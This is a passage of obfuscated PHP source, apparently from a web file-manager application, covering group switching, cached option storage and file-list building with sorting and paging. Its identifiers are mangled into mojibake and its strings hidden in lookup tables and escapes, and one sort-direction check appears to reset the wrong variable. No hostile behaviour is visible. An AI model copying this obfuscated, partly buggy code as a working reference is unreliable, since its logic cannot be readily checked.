$Ü–Ïºı[$ÇîÏ©ì[$ÊŸ¬ôÚÈ[470]]]; } $¹É¶ÊÃ¦[] = 0; $¹É¶ÊÃ¦ = $ÊŸ¬ôÚÈ[60] . implode($ÊŸ¬ôÚÈ[60], array_reverse($¹É¶ÊÃ¦)) . $ÊŸ¬ôÚÈ[60]; $this->setNamePinyin($²‚ò[$»•·€åñ], $²‚ò[$ÊŸ¬ôÚÈ[42]]); $this->where(array($»•·€åñ => $²‚ò[$»•·€åñ]))->save(array($ÊŸ¬ôÚÈ[618] => $¹É¶ÊÃ¦)); } return $Ü–Ïºı; } public function groupNameAuto($¶Çˆ’…³, $Í„Í“Ó) { $‹Ñêêşï =& $_SERVER[ªÏ§Ë·]; $Ë’­§ãµ = $this->where(array($‹Ñêêşï[439] => $¶Çˆ’…³))->getField($‹Ñêêşï[42], !0); if (!$Ë’­§ãµ || !in_array($Í„Í“Ó, $Ë’­§ãµ)) { return $Í„Í“Ó; } for ($²»œ¡Ê² = 1; $²»œ¡Ê² <= count($Ë’­§ãµ) + 1; $²»œ¡Ê²++) { $Ş»’»¨ = $Í„Í“Ó . "\x28{$²»œ¡Ê²}\x29"; if (!in_array($Ş»’»¨, $Ë’­§ãµ)) { return $Ş»’»¨; } } } public function groupSwitch($¦ˆ†ô¥Ê, $äòÃÎº) { $âÚ¸çº =& $_SERVER[ªÏ§Ë·]; $Øöİ¦Æ = array($âÚ¸çº[1857] => array($âÚ¸çº[7], array($¦ˆ†ô¥Ê, $äòÃÎº))); $–ë®ŞéÈ = $this->where($Øöİ¦Æ)->select(); $–ë®ŞéÈ = array_to_keyvalue($–ë®ŞéÈ, $âÚ¸çº[1857]); if (!isset($–ë®ŞéÈ[$¦ˆ†ô¥Ê]) || !isset($–ë®ŞéÈ[$äòÃÎº]) || $–ë®ŞéÈ[$¦ˆ†ô¥Ê][$âÚ¸çº[470]] == 0) { return !1; } $Øöİ¦Æ = array($âÚ¸çº[1857] => $¦ˆ†ô¥Ê); $µä¶í·Ë = Model($âÚ¸çº[1947])->where($Øöİ¦Æ)->select(); if (!$µä¶í·Ë) { $µä¶í·Ë = array(); } foreach ($µä¶í·Ë as $¤¤µÀäè) { $°ªæµÑ” = $¤¤µÀäè[$âÚ¸çº[1667]]; $Øöİ¦Æ = array($âÚ¸çº[1667] => $°ªæµÑ”, $âÚ¸çº[1857] => $äòÃÎº); $ïÛÒıÕÕ = Model($âÚ¸çº[1947])->where($Øöİ¦Æ)->find(); if (!$ïÛÒıÕÕ) { $‘¦—æÍ© = array($äòÃÎº => $¤¤µÀäè[$âÚ¸çº[1961]]); Model($âÚ¸çº[563])->userGroupAdd($°ªæµÑ”, $‘¦—æÍ©); } Model($âÚ¸çº[563])->userGroupRemove($°ªæµÑ”, $¦ˆ†ô¥Ê); } $Øöİ¦Æ = array($âÚ¸çº[449] => 2, $âÚ¸çº[470] => 0, $âÚ¸çº[448] => 1, $âÚ¸çº[534] => array($âÚ¸çº[7], array($¦ˆ†ô¥Ê, $äòÃÎº))); $ïá¿½»¸ = Model($âÚ¸çº[853])->where($Øöİ¦Æ)->field($âÚ¸çº[1962])->select(); $ïá¿½»¸ = array_to_keyvalue($ïá¿½»¸, $âÚ¸çº[534], $âÚ¸çº[440]); $ëª‹Ÿ = !empty($ïá¿½»¸[$¦ˆ†ô¥Ê]) ? $ïá¿½»¸[$¦ˆ†ô¥Ê] : !1; if ($ëª‹Ÿ) { if (!$ïá¿½»¸[$äòÃÎº]) { $ïá¿½»¸[$äòÃÎº] = Model($âÚ¸çº[853])->groupRootAdd($äòÃÎº); } $ºÊğÔ = $ïá¿½»¸[$äòÃÎº]; $Øöİ¦Æ = array($âÚ¸çº[470] => $ëª‹Ÿ); $ïá¿½»¸ = Model($âÚ¸çº[853])->where($Øöİ¦Æ)->field($âÚ¸çº[1963])->select(); if (!$ïá¿½»¸) { $ïá¿½»¸ = array(); } Model($âÚ¸çº[853])->moveClearAuth = !1; foreach ($ïá¿½»¸ as $ÃûôË´—) { $¦Çè“Îì = $ÃûôË´—[$âÚ¸çº[448]] == $âÚ¸çº[98] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($âÚ¸çº[853])->move($ÃûôË´—[$âÚ¸çº[440]], $ºÊğÔ, $¦Çè“Îì); } Model($âÚ¸çº[853])->moveClearAuth = !0; $Øöİ¦Æ = array($âÚ¸çº[449] => 2, $âÚ¸çº[534] => $¦ˆ†ô¥Ê); $ÎŸ˜Áá = array($âÚ¸çº[534] => $äòÃÎº); Model($âÚ¸çº[1964])->where($Øöİ¦Æ)->save($ÎŸ˜Áá); Model($âÚ¸çº[1965])->where($Øöİ¦Æ)->save($ÎŸ˜Áá); } $this->_changeChildLevel($–ë®ŞéÈ[$¦ˆ†ô¥Ê], $–ë®ŞéÈ[$äòÃÎº], !0); $this->where(array($âÚ¸çº[470] => $¦ˆ†ô¥Ê))->save(array($âÚ¸çº[470] => $äòÃÎº)); $this->_clearChildrenCache($–ë®ŞéÈ[$äòÃÎº]); return !0; } } goto C·ºÁœÍ; Eæßõ³†‚¡: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ñÒÒ¾ = false, $®“ÃöæÇ = '', $áëÜ»ª© = false) { $©ŸÇ×ö =& $_SERVER[ªÏ§Ë·]; $¿¡ğÎÈò = $this->cacheGet($®“ÃöæÇ); $·—Ø÷éÅ = $this->optionDefault($®“ÃöæÇ); $·—Ø÷éÅ = is_array($·—Ø÷éÅ) ? $·—Ø÷éÅ : array(); if (is_array($¿¡ğÎÈò)) { $¿¡ğÎÈò = array_merge($·—Ø÷éÅ, $¿¡ğÎÈò); return $ñÒÒ¾ ? isset($¿¡ğÎÈò[$ñÒÒ¾]) ? $¿¡ğÎÈò[$ñÒÒ¾] : null : $¿¡ğÎÈò; } $¶’õÈ½ = $this->filterWhere(array($©ŸÇ×ö[43] => $®“ÃöæÇ)); $¿¡ğÎÈò = $this->where($¶’õÈ½)->select(); $¿¡ğÎÈò = array_to_keyvalue($¿¡ğÎÈò, $©ŸÇ×ö[104], $©ŸÇ×ö[412]); foreach ($¿¡ğÎÈò as $°¤»õÛ¹ => $åÔµµ…) { if ($áëÜ»ª© || in_array($°¤»õÛ¹, $this->jsonField)) { $¿¡ğÎÈò[$°¤»õÛ¹] = json_decode($åÔµµ…, !0); } } $this->cacheSet($®“ÃöæÇ, $¿¡ğÎÈò); $¿¡ğÎÈò = array_merge($·—Ø÷éÅ, $¿¡ğÎÈò); return $ñÒÒ¾ ? $¿¡ğÎÈò[$ñÒÒ¾] : $¿¡ğÎÈò; } public function set($Œáø˜ö’, $ı…öÆ”Ñ = false, $®æšÁã = '') { $Ô±°ƒÚ© =& $_SERVER[ªÏ§Ë·]; $this->cacheRemove($®æšÁã); $õ¾è¡óï = array(); $™™ÄÖí¿ = is_array($Œáø˜ö’) ? $Œáø˜ö’ : array($Œáø˜ö’ => $ı…öÆ”Ñ); foreach ($™™ÄÖí¿ as $ºá·‘‚÷ => $¸Ù›ÉäÅ) { if (is_array($¸Ù›ÉäÅ)) { $¸Ù›ÉäÅ = json_encode_force($¸Ù›ÉäÅ); } $this->checkLength($¸Ù›ÉäÅ, !1, $this->tableName . $Ô±°ƒÚ©[4] . $Œáø˜ö’); $¸Ù›ÉäÅ = self::textEncode($¸Ù›ÉäÅ); $™™ÄÖí¿ = array($Ô±°ƒÚ©[43] => $®æšÁã, $Ô±°ƒÚ©[104] => $ºá·‘‚÷, $Ô±°ƒÚ©[412] => $¸Ù›ÉäÅ); $õ¾è¡óï[] = $this->filterWhere($™™ÄÖí¿); } if (!$õ¾è¡óï) { return !0; } $ˆº© ØĞ = $this->cacheKey($Ô±°ƒÚ©[438]); CacheLock::lock($ˆº© ØĞ); $ Øå‹³ = $this->addAll($õ¾è¡óï, array(), !0); CacheLock::unlock($ˆº© ØĞ); return $ Øå‹³; } protected function optionDefault($àÒïÕ = '') { return !1; } public function setDeep($İï¶›¦, $ƒ‘ú÷å± = false, $öç±€Ë = '') { $ô«ÌŸå¿ = explode($_SERVER[ªÏ§Ë·][10], $İï¶›¦); $óßŒ…°İ = $this->get(); array_set_value($óßŒ…°İ, $İï¶›¦, $ƒ‘ú÷å±); $this->set($ô«ÌŸå¿[0], $óßŒ…°İ[$ô«ÌŸå¿[0]], $öç±€Ë); } public function remove($µÜ”ıÌŒ, $ÍÅˆ¸æª = '') { $ÑÂ®”ŠÔ =& $_SERVER[ªÏ§Ë·]; $this->cacheRemove($ÍÅˆ¸æª); $¬ÍÅ¼ÍË = $this->filterWhere(array($ÑÂ®”ŠÔ[104] => $µÜ”ıÌŒ, $ÑÂ®”ŠÔ[43] => $ÍÅˆ¸æª)); if (is_null($µÜ”ıÌŒ)) { unset($¬ÍÅ¼ÍË[$ÑÂ®”ŠÔ[104]]); } return $this->where($¬ÍÅ¼ÍË)->delete(); } public function cacheSet($ğ§üºí, $‰Á¯ÄÀ„ = false) { return Cache::set($this->cacheKey($ğ§üºí), $‰Á¯ÄÀ„); } public function cacheGet($†÷èÇı) { return Cache::get($this->cacheKey($†÷èÇı)); } public function cacheRemove($‹É‹¬ÓÏ) { return Cache::remove($this->cacheKey($‹É‹¬ÓÏ)); } protected function filterWhere($ùİñ¡¨…) { return $ùİñ¡¨…; } protected function cacheKey($ú¼ØË”©) { return $ú¼ØË”©; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\x72\x63\x65"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\141\155\145" => "\151\157\137\x73\x6f\x75\162\143\145\x5f\155\145\164\141", "\x6d\145\164\x61\106\x69\x65\154\x64" => "\163\x6f\x75\162\143\x65\x49\104"); protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\124\151\155\x65", "\x74\x69\x6d\145", "\x69\156\163\145\162\164", "\146\x75\156\143\164\151\157\156"), array("\143\x72\x65\141\164\x65\x54\x69\x6d\145", "\164\151\x6d\145", "\x69\156\163\x65\162\164", "\146\x75\x6e\x63\x74\151\157\x6e"), array("\166\x69\x65\167\x54\151\155\x65", "\164\x69\155\145", "\x69\156\x73\x65\162\x74", "\x66\165\x6e\143\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Ã¸Ë‰áâ) { return $this->listSource(array($_SERVER[ªÏ§Ë·][439] => $Ã¸Ë‰áâ)); } public function typeName($¬”±œ†) { static $°¾ìÂ = array(self::TYPE_SYSTEM => "\163\x79\163\164\x65\x6d", self::TYPE_USER => "\x75\163\x65\x72", self::TYPE_GROUP => "\x67\x72\157\165\160"); return $°¾ìÂ[$¬”±œ† . $_SERVER[ªÏ§Ë·][12]]; } public function sourceListInfo($ªâ‘æë, $Äß©ê× = false) { $šøˆ°÷ö =& $_SERVER[ªÏ§Ë·]; $ªâ‘æë = $ªâ‘æë ? $ªâ‘æë : array(); $ªâ‘æë = array_filter(array_unique($ªâ‘æë)); if (!$ªâ‘æë) { return array(); } $»ùºñË› = $this->where(array($šøˆ°÷ö[440] => array($šøˆ°÷ö[7], $ªâ‘æë)))->select(); $this->_listDataApply($»ùºñË›, $Äß©ê×); return array_to_keyvalue($»ùºñË›, $šøˆ°÷ö[440]); } public function pathInfoFilter(&$‹Œ²¢¸Ì) { $Åè£çç¹ =& $_SERVER[ªÏ§Ë·]; static $ƒá“ò±Š = false; static $ìğâ = false; static $ò­Î•° = false; if (!$ƒá“ò±Š) { $çœ¾ÍÙŸ = $Åè£çç¹[441]; $çœ¾ÍÙŸ .= $Åè£çç¹[442]; $çœ¾ÍÙŸ .= $Åè£çç¹[443]; $ßüØÜ = $Åè£çç¹[444]; $ãÃåı¨Â = explode($Åè£çç¹[60], $ßüØÜ); $ƒá“ò±Š = explode($Åè£çç¹[60], $çœ¾ÍÙŸ); $ìğâ = array(); foreach ($ƒá“ò±Š as $À¢úÏ ) { if (in_array($À¢úÏ , $ãÃåı¨Â)) { continue; } $ìğâ[] = $À¢úÏ ; } $ò­Î•° = explode($Åè£çç¹[60], $Åè£çç¹[445]); } foreach ($ò­Î•° as $–¤â©å¾) { if (isset($‹Œ²¢¸Ì[$–¤â©å¾])) { $‹Œ²¢¸Ì[$–¤â©å¾] = intval($‹Œ²¢¸Ì[$–¤â©å¾]); } } $‹Œ²¢¸Ì[$Åè£çç¹[94]] = $Åè£çç¹[446] . $‹Œ²¢¸Ì[$Åè£çç¹[440]] . $Åè£çç¹[447]; $‹Œ²¢¸Ì[$Åè£çç¹[43]] = $‹Œ²¢¸Ì[$Åè£çç¹[448]] == 1 ? $Åè£çç¹[85] : $Åè£çç¹[210]; $‹Œ²¢¸Ì[$Åè£çç¹[449]] = $this->typeName($‹Œ²¢¸Ì[$Åè£çç¹[449]]); if ($‹Œ²¢¸Ì[$Åè£çç¹[448]] != 1) { $‹Œ²¢¸Ì[$Åè£çç¹[184]] = $‹Œ²¢¸Ì[$Åè£çç¹[450]]; unset($‹Œ²¢¸Ì[$Åè£çç¹[450]]); } $™ºò—ÔÃ = $ƒá“ò±Š; if (isset($‹Œ²¢¸Ì[$Åè£çç¹[451]]) && $‹Œ²¢¸Ì[$Åè£çç¹[451]][$Åè£çç¹[452]] == -1) { $™ºò—ÔÃ = $ìğâ; } $‹Œ²¢¸Ì = array_field_key($‹Œ²¢¸Ì, $™ºò—ÔÃ); return $‹Œ²¢¸Ì; } public function listUserFav() { $Šîü¬¿Î =& $_SERVER[ªÏ§Ë·]; $‚‡Õß¤… = Model($Šîü¬¿Î[453])->listData(); $æşÁœ¤¼ = array_filter_by_field($‚‡Õß¤…, $Šîü¬¿Î[43], $Šîü¬¿Î[454]); $æşÁœ¤¼ = array_to_keyvalue($æşÁœ¤¼, $Šîü¬¿Î[12], $Šîü¬¿Î[94]); if ($æşÁœ¤¼) { $‹ü¿‘ú¤ = $this->listSource(array($Šîü¬¿Î[455] => array($Šîü¬¿Î[456], $æşÁœ¤¼))); } $‹ü¿‘ú¤ = array_to_keyvalue($‹ü¿‘ú¤[$Šîü¬¿Î[407]], $Šîü¬¿Î[440]); foreach ($‚‡Õß¤… as &$²éÀ†‚’) { $²éÀ†‚’ = array($Šîü¬¿Î[457] => $²éÀ†‚’[$Šîü¬¿Î[437]], $Šîü¬¿Î[458] => $²éÀ†‚’[$Šîü¬¿Î[42]], $Šîü¬¿Î[459] => $²éÀ†‚’[$Šîü¬¿Î[94]], $Šîü¬¿Î[460] => $²éÀ†‚’[$Šîü¬¿Î[43]], $Šîü¬¿Î[461] => $²éÀ†‚’[$Šîü¬¿Î[211]], $Šîü¬¿Î[462] => $²éÀ†‚’[$Šîü¬¿Î[95]]); if ($²éÀ†‚’[$Šîü¬¿Î[43]] == $Šîü¬¿Î[454] && $‹ü¿‘ú¤[$²éÀ†‚’[$Šîü¬¿Î[94]]]) { $²éÀ†‚’[$Šîü¬¿Î[97]] = $‹ü¿‘ú¤[$²éÀ†‚’[$Šîü¬¿Î[94]]]; } } unset($²éÀ†‚’); return $‚‡Õß¤…; } public function listUserTag($¯¯Ö›€ø) { $Ë¾ÈšÒè =& $_SERVER[ªÏ§Ë·]; if ($¯¯Ö›€ø && !is_array($¯¯Ö›€ø)) { $¯¯Ö›€ø = array($¯¯Ö›€ø); } $¥œù™µÖ = Model($Ë¾ÈšÒè[463])->listData(); $û°„£’Ë = array(); $±†İÒÕ¹ = array(); foreach ($¥œù™µÖ as $ı•™¹¼É) { $¤Ş¦ÍîÃ = $ı•™¹¼É[$Ë¾ÈšÒè[94]]; if (!$¤Ş¦ÍîÃ) { continue; } if (!isset($±†İÒÕ¹[$¤Ş¦ÍîÃ])) { $±†İÒÕ¹[$¤Ş¦ÍîÃ] = array(); } $±†İÒÕ¹[$¤Ş¦ÍîÃ][] = $ı•™¹¼É[$Ë¾ÈšÒè[464]]; $û°„£’Ë[$ı•™¹¼É[$Ë¾ÈšÒè[94]]] = $ı•™¹¼É; } $¨ÁŒã¸Ú = array(); $”§¦øú’ = array(); $ÊªŒ°€¯ = array(); foreach ($±†İÒÕ¹ as $ÛÄÅÔ¤˜ => $¡¹¬äÃâ) { $Î±¿äÉË = !0; if (!$¯¯Ö›€ø) { $¨ÁŒã¸Ú[] = $ÛÄÅÔ¤˜; continue; } foreach ($¯¯Ö›€ø as $—Ûìå“) { if (!in_array($—Ûìå“, $¡¹¬äÃâ)) { $Î±¿äÉË = !1; break; } } if (!$Î±¿äÉË) { continue; } if (!is_numeric($ÛÄÅÔ¤˜)) { $úÑŸâşÕ = $û°„£’Ë[$ÛÄÅÔ¤˜]; $¦µ®›’ = array($Ë¾ÈšÒè[42] => $úÑŸâşÕ[$Ë¾ÈšÒè[42]], $Ë¾ÈšÒè[94] => $úÑŸâşÕ[$Ë¾ÈšÒè[94]], $Ë¾ÈšÒè[43] => $úÑŸâşÕ[$Ë¾ÈšÒè[43]], $Ë¾ÈšÒè[97] => array($Ë¾ÈšÒè[465] => 1), $Ë¾ÈšÒè[212] => !0); if ($úÑŸâşÕ[$Ë¾ÈšÒè[43]] == $Ë¾ÈšÒè[210]) { $ÊªŒ°€¯[] = $¦µ®›’; } if ($úÑŸâşÕ[$Ë¾ÈšÒè[43]] == $Ë¾ÈšÒè[85]) { $”§¦øú’[] = $¦µ®›’; } continue; } $¨ÁŒã¸Ú[] = $ÛÄÅÔ¤˜; } if ($¨ÁŒã¸Ú) { $ÑÛ¢æ­İ = $this->listSource(array($Ë¾ÈšÒè[455] => array($Ë¾ÈšÒè[456], $¨ÁŒã¸Ú))); } $ÑÛ¢æ­İ = $ÑÛ¢æ­İ ? $ÑÛ¢æ­İ : array($Ë¾ÈšÒè[92] => array(), $Ë¾ÈšÒè[93] => array()); $ÑÛ¢æ­İ[$Ë¾ÈšÒè[92]] = array_merge($ÑÛ¢æ­İ[$Ë¾ÈšÒè[92]], $”§¦øú’); $ÑÛ¢æ­İ[$Ë¾ÈšÒè[93]] = array_merge($ÑÛ¢æ­İ[$Ë¾ÈšÒè[93]], $ÊªŒ°€¯); if (isset($ÑÛ¢æ­İ[$Ë¾ÈšÒè[404]]) && count($¨ÁŒã¸Ú) == $ÑÛ¢æ­İ[$Ë¾ÈšÒè[404]][$Ë¾ÈšÒè[405]]) { return $ÑÛ¢æ­İ; } $ıŠ­„€ = array(); $Ï™¸¸ì‡ = array_to_keyvalue($ÑÛ¢æ­İ[$Ë¾ÈšÒè[92]], $Ë¾ÈšÒè[12], $Ë¾ÈšÒè[440]); $œº‰ñ†¶ = array_to_keyvalue($ÑÛ¢æ­İ[$Ë¾ÈšÒè[93]], $Ë¾ÈšÒè[12], $Ë¾ÈšÒè[440]); $‘„í¡ô« = array_merge($œº‰ñ†¶, $Ï™¸¸ì‡); foreach ($¨ÁŒã¸Ú as $¤Ş¦ÍîÃ) { if (!in_array($¤Ş¦ÍîÃ, $‘„í¡ô«)) { $ıŠ­„€[] = $¤Ş¦ÍîÃ; } } if ($ıŠ­„€) { Model($Ë¾ÈšÒè[466])->removeBySource($ıŠ­„€); } return $ÑÛ¢æ­İ; } public function listUserRecycle() { $¯ğïŸóØ =& $_SERVER[ªÏ§Ë·]; $à¼»Û‚ = Model($¯ğïŸóØ[467])->listData(); if (!$à¼»Û‚) { return array(); } $çü‡èŸ = array($¯ğïŸóØ[455] => array($¯ğïŸóØ[456], $à¼»Û‚), $¯ğïŸóØ[468] => 1); return $this->listSource($çü‡èŸ); } public function listSource($Š¾ŒÀĞ, $ÊÆáİö‚ = 3000, $îßøÌîÇ = false) { $Ô‰âá»ç =& $_SERVER[ªÏ§Ë·]; if (!isset($Š¾ŒÀĞ[$Ô‰âá»ç[469]])) { $Š¾ŒÀĞ[$Ô‰âá»ç[469]] = 0; } if (isset($Š¾ŒÀĞ[$Ô‰âá»ç[470]]) && $Š¾ŒÀĞ[$Ô‰âá»ç[470]] == $Ô‰âá»ç[208]) { $Š¾ŒÀĞ[$Ô‰âá»ç[450]] = array($Ô‰âá»ç[369], $Ô‰âá»ç[471]); } $èŠÃªêß = $Ô‰âá»ç[472]; $İù“Ì¤Š = $this->field($èŠÃªêß)->_makeOrder()->where($Š¾ŒÀĞ)->selectPage($ÊÆáİö‚); $this->_listPageCheck($İù“Ì¤Š, $èŠÃªêß, $Š¾ŒÀĞ); $this->_listDataApply($İù“Ì¤Š[$Ô‰âá»ç[407]], $îßøÌîÇ); $this->_listMake($İù“Ì¤Š); return $İù“Ì¤Š; } private function _listPageCheck(&$ÚÛ»‚, $á‹¼±ï², $Ÿà«üËì) { $Éƒ§¦û =& $_SERVER[ªÏ§Ë·]; if (!is_array($ÚÛ»‚[$Éƒ§¦û[404]])) { return; } $ÀÈ¿»à = $ÚÛ»‚[$Éƒ§¦û[404]]; if ($ÀÈ¿»à[$Éƒ§¦û[406]] <= 1) { return; } if ($ÀÈ¿»à[$Éƒ§¦û[405]] >= 100000) { return; } if (Model($Éƒ§¦û[473])->get($Éƒ§¦û[474]) != $Éƒ§¦û[475]) { return; } $á‹¼±ï² = str_replace(array($Éƒ§¦û[63], $Éƒ§¦û[380], $Éƒ§¦û[19]), $Éƒ§¦û[12], $á‹¼±ï²); $á‹¼±ï² = $Éƒ§¦û[476] . str_replace($Éƒ§¦û[60], $Éƒ§¦û[477], $á‹¼±ï²) . $Éƒ§¦û[478]; $¯¸íÀ¾í = $Éƒ§¦û[479]; $¯¸íÀ¾í = $¯¸íÀ¾í . $Éƒ§¦û[480]; $ÖÛ¨—¸û = $ÀÈ¿»à[$Éƒ§¦û[401]] * ($ÀÈ¿»à[$Éƒ§¦û[391]] - 1) . $Éƒ§¦û[60] . $ÀÈ¿»à[$Éƒ§¦û[401]]; $şÌ—å = $this->_makeOrder(!0); $¯µçíãÁ = $Éƒ§¦û[476] . str_replace($Éƒ§¦û[60], $Éƒ§¦û[477], $şÌ—å[0]); if (strpos($¯µçíãÁ, $Éƒ§¦û[481])) { $¯µçíãÁ = str_replace($Éƒ§¦û[481], $Éƒ§¦û[482], $¯µçíãÁ); } else { $¯µçíãÁ .= $Éƒ§¦û[483] . $şÌ—å[1]; } $ªÑÂÇ = array(); foreach ($Ÿà«üËì as $ßñîÜà‡ => $ª¦èı§) { $ªÑÂÇ[$Éƒ§¦û[476] . $ßñîÜà‡] = $ª¦èı§; } $this->alias($Éƒ§¦û[484])->field($á‹¼±ï²)->limit($ÖÛ¨—¸û)->order($¯µçíãÁ); $™—€»Üà = $this->join($¯¸íÀ¾í)->where($ªÑÂÇ)->select(); if ($™—€»Üà) { $ÚÛ»‚[$Éƒ§¦û[407]] = $™—€»Üà; } } protected function _makeOrder($ËõğÂšó = false) { $·é¬ÓòÙ =& $_SERVER[ªÏ§Ë·]; $Ö×ªÕ³Ì = Model($·é¬ÓòÙ[485])->get($·é¬ÓòÙ[486]); $åãÕŞ¨¸ = Model($·é¬ÓòÙ[485])->get($·é¬ÓòÙ[487]); $Ø¥Ÿ•çÍ = array($·é¬ÓòÙ[488] => $·é¬ÓòÙ[489], $·é¬ÓòÙ[490] => $·é¬ÓòÙ[491]); $¿‘¹¬È® = array($·é¬ÓòÙ[42] => $·é¬ÓòÙ[42], $·é¬ÓòÙ[86] => $·é¬ÓòÙ[86], $·é¬ÓòÙ[184] => $·é¬ÓòÙ[450], $·é¬ÓòÙ[492] => $·é¬ÓòÙ[492], $·é¬ÓòÙ[493] => $·é¬ÓòÙ[494], $·é¬ÓòÙ[211] => $·é¬ÓòÙ[211], $·é¬ÓòÙ[95] => $·é¬ÓòÙ[95]); $ÇéÆ…§î = Input::get($·é¬ÓòÙ[495], $·é¬ÓòÙ[7], $Ö×ªÕ³Ì, array_keys($¿‘¹¬È®)); $ğü‚Ö–Ş = Input::get($·é¬ÓòÙ[496], $·é¬ÓòÙ[7], $åãÕŞ¨¸, array_keys($Ø¥Ÿ•çÍ)); if (!in_array($ÇéÆ…§î, array_keys($¿‘¹¬È®))) { $ÇéÆ…§î = $·é¬ÓòÙ[42]; } if (!in_array($ğü‚Ö–Ş, array_keys($Ø¥Ÿ•çÍ))) { $ÇéÆ…§î = $·é¬ÓòÙ[488]; } if ($ÇéÆ…§î == $·é¬ÓòÙ[42]) { } $ØŞ¥ÎÏÍ = $·é¬ÓòÙ[497] . $¿‘¹¬È®[$ÇéÆ…§î] . $·é¬ÓòÙ[63] . $Ø¥Ÿ•çÍ[$ğü‚Ö–Ş]; $ØŞ¥ÎÏÍ = rtrim(trim($ØŞ¥ÎÏÍ), $·é¬ÓòÙ[60]); if ($ËõğÂšó) { return array($ØŞ¥ÎÏÍ, $Ø¥Ÿ•çÍ[$ğü‚Ö–Ş]); } return $this->order($ØŞ¥ÎÏÍ); } protected function _listDataApplyItem($ÜÎ³ß×õ, $—½š®°î = false) { $Æøü‘ãŠ = array($ÜÎ³ß×õ); $this->_listDataApply($Æøü‘ãŠ, $—½š®°î); return $Æøü‘ãŠ[0]; } protected function _listDataApply(&$âáõšÁ‘, $åŒØ§é¢ = false) { $ßú®™Ø² =& $_SERVER[ªÏ§Ë·]; if (!$âáõšÁ‘) { $âáõšÁ‘ = array(); return; } $âÖáºÃ = array_to_keyvalue($âáõšÁ‘, $ßú®™Ø²[12], $ßú®™Ø²[440]); $âÖáºÃ = array_unique($âÖáºÃ); $this->_listSourceCache($âáõšÁ‘); if (!$åŒØ§é¢) { $this->_listAppendMeta($âáõšÁ‘, $âÖáºÃ); $this->_listAppendFileMeta($âáõšÁ‘, $âÖáºÃ); $this->_listAppendChildren($âáõšÁ‘, $âÖáºÃ); } $this->_listAppendPath($âáõšÁ‘); $this->_listAppendAuth($âáõšÁ‘); $this->_listAppendSourceInfo($âáõšÁ‘, $âÖáºÃ); $this->_listAppendUser($âáõšÁ‘); $this->_listFilterInfo($âáõšÁ‘, $åŒØ§é¢); $this->_listAppendAuthSecret($âáõšÁ‘); } protected function _listSourceCache($™ËæÅ¢ù) { $ßƒÎ€§å =& $_SERVER[ªÏ§Ë·]; foreach ($™ËæÅ¢ù as $©²Ûá¥) { self::$cacheSourceInfo[$ßƒÎ€§å[498] . $©²Ûá¥[$ßƒÎ€§å[440]]] = $©²Ûá¥; } } protected function _listFilterInfo(&$Æ«å¨É, $õğûÌ€Â = false) { $œ¾ÂèØ =& $_SERVER[ªÏ§Ë·]; foreach ($Æ«å¨É as &$ÔªñÙ­ø) { $ÔªñÙ­ø = $this->pathInfoFilter($ÔªñÙ­ø); self::$cachePathInfo[$œ¾ÂèØ[499] . intval($õğûÌ€Â) . $œ¾ÂèØ[424] . $ÔªñÙ­ø[$œ¾ÂèØ[440]]] = $ÔªñÙ­ø; } unset($ÔªñÙ­ø); } protected function _listMake(&$Û÷„²è„) { $Ã¿×ú”“ =& $_SERVER[ªÏ§Ë·]; $Û÷„²è„[$Ã¿×ú”“[92]] = array(); $Û÷„²è„[$Ã¿×ú”“[93]] = array(); foreach ($Û÷„²è„[$Ã¿×ú”“[407]] as $§ÀË¡â’) { $º„­·‚ = $§ÀË¡â’[$Ã¿×ú”“[448]] == 1 ? $Ã¿×ú”“[92] : $Ã¿×ú”“[93]; $Û÷„²è„[$º„­·‚][] = $§ÀË¡â’; } unset($Û÷„²è„[$Ã¿×ú”“[407]]); } protected function _listAppendMeta(&$‡æØ¢„, $ˆøóºÃ) { $Á×¢×şì =& $_SERVER[ªÏ§Ë·]; $÷¡½¡ìĞ = array($Á×¢×şì[455] => array($Á×¢×şì[456], $ˆøóºÃ)); $Çßõ’¼Î = Model($Á×¢×şì[500])->field($Á×¢×şì[501])->where($÷¡½¡ìĞ)->select(); if (!$Çßõ’¼Î) { return; } $½ÇääÀÖ = array($Á×¢×şì[502], $Á×¢×şì[503], $Á×¢×şì[482]); $à´›½ş” = array(); foreach ($Çßõ’¼Î as $¢îÆÕ›ø) { if (!isset($à´›½ş”[$¢îÆÕ›ø[$Á×¢×şì[440]]])) { $à´›½ş”[$¢îÆÕ›ø[$Á×¢×şì[440]]] = array(); } if (in_array($¢îÆÕ›ø[$Á×¢×şì[104]], $½ÇääÀÖ)) { continue; } $à´›½ş”[$¢îÆÕ›ø[$Á×¢×şì[440]]][$¢îÆÕ›ø[$Á×¢×şì[104]]] = $¢îÆÕ›ø[$Á×¢×şì[412]]; } foreach ($‡æØ¢„ as &$ğĞ¼„Üš) { $ğĞ¼„Üš[$Á×¢×şì[504]] = !1; if (isset($à´›½ş”[$ğĞ¼„Üš[$Á×¢×şì[440]]])) { $ğĞ¼„Üš[$Á×¢×şì[504]] = $à´›½ş”[$ğĞ¼„Üš[$Á×¢×şì[440]]]; } if ($this->fileIsLock($ğĞ¼„Üš) && $ğĞ¼„Üš[$Á×¢×şì[451]]) { $¢›ó—²ù = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ğĞ¼„Üš[$Á×¢×şì[451]][$Á×¢×şì[452]] = AuthModel::authDisable($ğĞ¼„Üš[$Á×¢×şì[451]][$Á×¢×şì[452]], $¢›ó—²ù); $ğĞ¼„Üš[$Á×¢×şì[451]][$Á×¢×şì[505]][$Á×¢×şì[451]] = $ğĞ¼„Üš[$Á×¢×şì[451]][$Á×¢×şì[452]]; } } unset($ğĞ¼„Üš); } protected function _listAppendFileMeta(&$ß¼èÔĞÁ, $€ª„şö) { $Ö€ïñ”ë =& $_SERVER[ªÏ§Ë·]; $½Ä—Ï¹× = array_to_keyvalue($ß¼èÔĞÁ, $Ö€ïñ”ë[12], $Ö€ïñ”ë[506]); $½Ä—Ï¹× = array_filter(array_unique($½Ä—Ï¹×)); if (!$½Ä—Ï¹×) { return; } $¤÷£å¦Ö = array($Ö€ïñ”ë[507] => 